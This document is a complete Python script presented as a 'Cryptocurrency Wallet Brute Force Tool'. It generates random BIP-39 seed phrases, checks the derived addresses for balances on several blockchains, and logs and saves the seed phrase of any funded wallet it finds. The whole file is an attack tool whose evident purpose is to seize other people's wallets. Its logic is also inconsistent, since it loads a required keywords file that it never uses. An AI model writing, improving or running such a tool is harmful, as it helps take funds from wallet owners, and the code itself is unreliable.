#!/usr/bin/env python3
"""
Cryptocurrency Wallet Brute Force Tool
This script generates random BIP-39 seed phrases and checks for balances
across multiple blockchain networks.
"""

import os
import random
import threading
import time
import argparse
import logging
from datetime import datetime

from wallet_generator import generate_addresses
from balance_checker import check_balance
from config import API_CONFIG

# Set up logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler("brute_force_log.txt")
    ]
)

# Global variables
running = True
attempts = 0
found_wallets = 0

def read_keywords(filename):
    """Read BIP-39 keywords from a file."""
    try:
        with open(filename, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        logging.error(f"Keywords file '{filename}' not found.")
        return []
    except Exception as e:
        logging.error(f"Error reading keywords file: {str(e)}")
        return []

def save_findings(mnemonic, addresses, balances):
    """Save found wallets with balances to a file."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    with open("found_wallets.txt", "a") as f:
        f.write(f"=== WALLET FOUND: {timestamp} ===\n")
        f.write(f"Seed phrase: {mnemonic}\n")
        
        for network in addresses.keys():
            f.write(f"{network} Address: {addresses[network]}\n")
            f.write(f"{network} Balance: {balances[network]}\n")
        
        f.write("\n")

def display_stats():
    """Display current statistics."""
    logging.info(f"Attempts: {attempts} | Found: {found_wallets}")

def stop_monitor():
    """Function to handle stopping the monitoring process."""
    global running
    input("Press Enter to stop the process...\n")
    logging.info("Stopping the brute force process...")
    running = False

def brute_force(keywords, target_networks, check_interval=1.0, report_interval=100):
    """
    Main brute force function to generate and check wallets.
    
    Args:
        keywords: List of BIP-39 keywords
        target_networks: List of networks to check
        check_interval: Time to wait between API calls
        report_interval: How often to report statistics
    """
    global running, attempts, found_wallets
    
    if len(keywords) < 12:
        logging.error("Need at least 12 keywords in the file!")
        return
    
    # Start the monitor for stopping the process
    threading.Thread(target=stop_monitor, daemon=True).start()
    
    logging.info(f"Starting brute force process for networks: {', '.join(target_networks)}")
    logging.info(f"Loaded {len(keywords)} keywords")
    
    start_time = time.time()
    
    # Import BIP tools
    from bip_utils import Bip39MnemonicGenerator
    
    while running:
        try:
            # Generate a valid BIP-39 mnemonic instead of random words
            mnemonic = Bip39MnemonicGenerator().FromWordsNumber(words_num=12).ToStr()
            
            attempts += 1
            
            # Generate addresses from the mnemonic
            addresses = generate_addresses(mnemonic)
            if not addresses:
                continue
            
            # Check balances for each network
            balances = {}
            for network in target_networks:
                if network in addresses:
                    balances[network] = check_balance(network, addresses[network])
                    time.sleep(check_interval)  # Avoid rate limiting
            
            # Report if any balance is found
            if any(balances.values()):
                found_wallets += 1
                logging.info("\n" + "="*50)
                logging.info("BALANCE FOUND!")
                logging.info(f"Seed phrase: {mnemonic}")
                
                for net in target_networks:
                    if net in addresses:
                        logging.info(f"{net} Address: {addresses[net]}")
                        logging.info(f"{net} Balance: {balances[net]}")
                
                logging.info("="*50)
                
                # Save to file
                save_findings(mnemonic, addresses, balances)
            
            # Print stats periodically
            if attempts % report_interval == 0:
                elapsed_time = time.time() - start_time
                rate = attempts / elapsed_time if elapsed_time > 0 else 0
                logging.info(f"Stats: {attempts} attempts, {found_wallets} found, {rate:.2f} attempts/sec")
        
        except Exception as e:
            logging.error(f"Error processing wallet: {str(e)}")
            continue

def main():
    """Main function to start the brute force process."""
    parser = argparse.ArgumentParser(description='Cryptocurrency Wallet Brute Force Tool')
    parser.add_argument('--keywords', type=str, default='keywords.txt',
                        help='Path to the keywords file (default: keywords.txt)')
    parser.add_argument('--networks', type=str, default='BTC,ETH,BSC,TRX',
                        help='Comma-separated list of networks to check (default: BTC,ETH,BSC,TRX)')
    parser.add_argument('--interval', type=float, default=1.0,
                        help='Interval between API calls in seconds (default: 1.0)')
    parser.add_argument('--report', type=int, default=100,
                        help='Report statistics every N attempts (default: 100)')
    
    args = parser.parse_args()
    
    # Validate networks
    networks = [n.strip().upper() for n in args.networks.split(',')]
    valid_networks = [net for net in networks if net in API_CONFIG]
    
    if not valid_networks:
        logging.error(f"No valid networks specified. Available networks: {', '.join(API_CONFIG.keys())}")
        return
    
    # Read keywords
    keywords = read_keywords(args.keywords)
    if not keywords:
        return
    
    try:
        # Start brute force process
        brute_force(
            keywords=keywords,
            target_networks=valid_networks,
            check_interval=args.interval,
            report_interval=args.report
        )
    except KeyboardInterrupt:
        logging.info("Process interrupted by user.")
    finally:
        logging.info(f"Brute force process completed. Total attempts: {attempts}, Found wallets: {found_wallets}")

if __name__ == '__main__':
    main()
